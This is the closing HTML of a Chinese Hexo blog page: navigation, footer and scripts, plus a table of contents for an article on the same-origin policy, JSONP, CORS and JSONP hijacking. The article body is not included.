    <img   class="lazyload" data-original="/image/95.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
  </div>
  <div class="icon">
    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
  </div>
</section>
        
        
  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript/" rel="tag">javascript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vulneralbility/" rel="tag">vulneralbility</a></li></ul> 

        
  <nav class="nav">
    <a href="/2019/09/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20javascript%20%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"><i class="iconfont iconleft"></i>JS 原型链污染</a>
    <a href="/2019/08/17/ntfs%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84ADS%E4%BE%9B%E9%80%89%E6%95%B0%E6%8D%AE%E6%B5%81/">ntfs 文件系统中的供选数据流<i class="iconfont iconright"></i></a>
  </nav>

      </section>
      
    </section>
  </div>
</article></div>
      <div class="col-xl-3">
        
          
  <aside class="toc-wrap">
    <h3 class="toc-title">文章目录：</h3>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-前言"><span class="toc-text">1@ 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-同源策略"><span class="toc-text">2@ 同源策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-介绍"><span class="toc-text">2.1 介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-限制范围"><span class="toc-text">2.2 限制范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-规避同源策略的方法"><span class="toc-text">2.3 规避同源策略的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、Cookie"><span class="toc-text">1、Cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、iframe"><span class="toc-text">2、iframe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、片段识别符"><span class="toc-text">3、片段识别符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、window-name"><span class="toc-text">4、window.name</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、window-postMessage"><span class="toc-text">5、window.postMessage</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-补充"><span class="toc-text">2.4 补充</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-JSONP-介绍"><span class="toc-text">3@ JSONP 介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-基础知识"><span class="toc-text">3.1 基础知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-JSONP-实现-ajax-的跨域请求"><span class="toc-text">3.2 JSONP 实现 ajax 的跨域请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-CORS-跨域资源共享"><span class="toc-text">3.3 CORS (跨域资源共享)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-JSONP-的劫持"><span class="toc-text">4@ JSONP 的劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-漏洞原理"><span class="toc-text">4.1 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-漏洞危害"><span class="toc-text">4.2 漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-漏洞利用"><span class="toc-text">4.3 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#寻找方法"><span class="toc-text">寻找方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-漏洞防御"><span class="toc-text">4.4 漏洞防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#补充（跨域-ajax-带-cookie-的问题）"><span class="toc-text">补充（跨域 ajax 带 cookie 的问题）</span></a></li></ol></li></ol>
  </aside>

        
      </div>
    </div>
  </div>
</main>
  

<footer class="footer">
  <div class="footer-social"><a 
        href="https://weibo.com/u/6479214985 "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color= '#09BB07'" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  iconweibo "></i>
      </a><a 
        href="https://twitter.com/rt9518 "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color= '#DA2E76'" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  twitter "></i>
      </a><a 
        href="https://github.com/59lx "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color= '#24292E'" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  icongithub-fill "></i>
      </a></div>
  
    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
  
</footer>
  
      <div class="fab fab-plus">
    <i class="iconfont iconplus"></i>
  </div>
  
  
  <div class="fab fab-up">
    <i class="iconfont iconcaret-up"></i>
  </div>
  
  
    <div class="scrollbar j-scrollbar">
  <div class="scrollbar-current j-scrollbar-current"></div>
</div>
  
  
    
<script src="/js/color-mode.js"></script>

  
</body>

<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>



  
<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>




  
<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>






  
<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>




<script src="/js/utils.js"></script>
<script src="/js/script.js"></script>





  <script>
    (function () {
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      } else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
    })();
  </script>













</html>